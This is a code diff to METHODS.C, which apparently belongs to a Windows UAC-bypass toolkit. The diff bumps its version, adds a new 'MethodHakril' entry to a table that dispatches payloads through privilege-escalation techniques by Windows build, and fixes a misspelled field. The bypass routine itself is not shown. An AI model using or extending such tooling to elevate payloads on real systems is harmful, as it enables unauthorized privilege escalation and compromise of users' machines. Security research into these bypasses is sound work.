@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     2.75
+*  VERSION:     2.76
 *
-*  DATE:        30 June 2017
+*  DATE:        13 July 2017
 *
 *  UAC bypass dispatch.
 *
@@ -49,7 +49,7 @@ UCM_API(MethodTyranid);
 UCM_API(MethodTokenMod);
 UCM_API(MethodJunction);
 UCM_API(MethodSXSDccw);
-//UCM_API(MethodTest2);
+UCM_API(MethodHakril);
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodTest, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
@@ -89,8 +89,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodTyranid, NULL, { 9600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodTokenMod, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodJunction, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodSXSDccw, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
-//    { MethodTest2, NULL, { 15063, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
+    { MethodSXSDccw, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodHakril, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -137,18 +137,18 @@ BOOL IsMethodMatchRequirements(
     //  Check availability. Diable this check for debugging build.
     //
 #ifndef _DEBUG
-    if (g_ctx.dwBuildNumber < Entry->Availablity.MinumumWindowsBuildRequired) {
+    if (g_ctx.dwBuildNumber < Entry->Availability.MinumumWindowsBuildRequired) {
         RtlSecureZeroMemory(&szMessage, sizeof(szMessage));
         _strcpy(szMessage, L"Current Windows Build: ");
         ultostr(g_ctx.dwBuildNumber, _strend(szMessage));
         _strcat(szMessage, L"\nMinimum Windows Build Required: ");
-        ultostr(Entry->Availablity.MinumumWindowsBuildRequired, _strend(szMessage));
+        ultostr(Entry->Availability.MinumumWindowsBuildRequired, _strend(szMessage));
         _strcat(szMessage, L"\nAborting execution.");
         ucmShowMessage(szMessage);
         SetLastError(ERROR_UNSUPPORTED_TYPE);
         return FALSE;
     }
-    if (g_ctx.dwBuildNumber >= Entry->Availablity.MinimumExpectedFixedWindowsBuild) {
+    if (g_ctx.dwBuildNumber >= Entry->Availability.MinimumExpectedFixedWindowsBuild) {
         if (ucmShowQuestion(UACFIX) == IDNO) {
             SetLastError(ERROR_UNSUPPORTED_TYPE);
             return FALSE;
@@ -707,4 +707,20 @@ UCM_API(MethodSXSDccw)
     UNREFERENCED_PARAMETER(ExtraContext);
 
     return ucmSXSMethodDccw(PayloadCode, PayloadSize);
+}
+
+UCM_API(MethodHakril)
+{
+    UNREFERENCED_PARAMETER(Method);
+    UNREFERENCED_PARAMETER(ExtraContext);
+
+#ifdef _WIN64
+    return ucmMethodHakril(PayloadCode, PayloadSize);
+#else
+    UNREFERENCED_PARAMETER(PayloadCode);
+    UNREFERENCED_PARAMETER(PayloadSize);
+
+    SetLastError(ERROR_INSTALL_PLATFORM_UNSUPPORTED);
+    return FALSE;
+#endif
 }
